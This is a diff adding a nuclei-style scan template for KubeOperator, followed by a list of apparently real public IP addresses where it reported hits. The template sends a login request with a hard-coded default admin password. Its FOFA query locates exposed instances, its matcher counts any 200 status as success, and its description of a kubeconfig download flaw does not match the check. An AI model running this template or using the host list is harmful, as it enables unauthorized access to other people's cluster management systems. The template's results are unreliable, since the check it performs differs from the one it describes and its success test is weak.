@@ -1,0 +1,47 @@
+id: weak_pass
+info:
+  name: KubeOperator
+  author: mike
+  severity: info
+  description: KubeOperator是一个开源的轻量级 Kubernetes 发行版，专注于帮助企业规划、部署和运营生产级别的 K8s 集群。KubeOperator 3.16.4之前版本存在授权问题漏洞，该漏洞源于API与未经授权的实体交互，由于下载kubeconfig的路径不需要身份认证，导致攻击者可直接下载kubeconfig获取相关敏感信息。
+  reference: xxx
+  remediation: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="KubeOperator"
+http:
+  - raw:
+      - |
+        POST /api/v1/auth/session HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json;charset=utf-8
+        lang: zh-CN
+        Content-Length: 65
+        Connection: close
+        Referer: {{BaseURL}}
+
+        {"username":"admin","password":"kubeoperator@admin123","code":""}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      # - type: word
+      #   words:
+      #     - 
+
+
+[info] http://101.37.145.57/api/v1/auth/session
+[info] http://114.217.31.201/api/v1/auth/session
+[info] http://117.78.51.135/api/v1/auth/session
+[info] http://116.181.19.168:18080/api/v1/auth/session
+[info] http://112.47.1.50:9090/api/v1/auth/session
+[info] http://106.14.71.115/api/v1/auth/session
+[info] http://120.48.73.154/api/v1/auth/session
+[info] http://121.36.217.122:8080/api/v1/auth/session
